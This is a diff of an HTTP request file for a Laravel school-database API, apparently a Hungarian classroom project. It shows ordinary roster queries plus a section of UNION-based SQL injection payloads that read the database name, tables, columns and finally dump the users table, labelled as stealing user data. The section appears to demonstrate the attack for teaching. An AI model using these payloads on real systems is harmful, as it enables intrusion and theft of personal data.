@@ -217,8 +217,11 @@ Authorization: Bearer {{token}}
 ###
 get {{host}}/api/queryOsztalynevsorok
 
+###
+get {{host}}/api/queryOsztalynevsorokObj
+
 ### get Valakinek az osztálytársai
-get {{host}}/api/queryOsztalytasrsak/Feri
+get {{host}}/api/queryOsztalytasrsak/Balla Albert
 Accept: application/json
 
 ### get Lapozós osztálynévsor
@@ -241,18 +244,18 @@ Accept: application/json
 #sql injection
 
 ### Mi az adatbázis neve A zárójelek kódjai: (: %28, ): %29
-get {{host}}/api/queryDiakKeres/Feri" union select database%28%29, '', '', '', '', '', '', '', '', ''%23 
+get {{host}}/api/queryDiakKeres/Feri" union select database(), '',  '', '', '', '', '','', ''%23 
 Accept: application/json
 
 ### Milyen táblák vannak?
-get {{host}}/api/queryDiakKeres/Feri" union select table_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE table_schema = 'laravel-iskola3'%23 
+get {{host}}/api/queryDiakKeres/Feri" union select table_name,  '', '', '', '', '', '', '', '' from information_schema.columns WHERE table_schema = 'laravel-iskola3'%23 
 Accept: application/json
 
 ### Milyen oszlopai vannak a user táblának?
-get {{host}}/api/queryDiakKeres/Feri" union select column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE table_name='diaks' AND table_schema = 'laravel-iskola3'%23 
+get {{host}}/api/queryDiakKeres/Feri" union select column_name,  '', '', '', '', '', '', '', '' from information_schema.columns WHERE table_name='diaks' AND table_schema = 'laravel-iskola3'%23 
 Accept: application/json
 
 ### user-ek adatainak ellopása A # url kódja: %23
-get {{host}}/api/queryDiakKeres/Feri" union select *, '', '' from users%23 
+get {{host}}/api/queryDiakKeres/Feri" union select *, '' from users%23 
 Accept: application/json
 
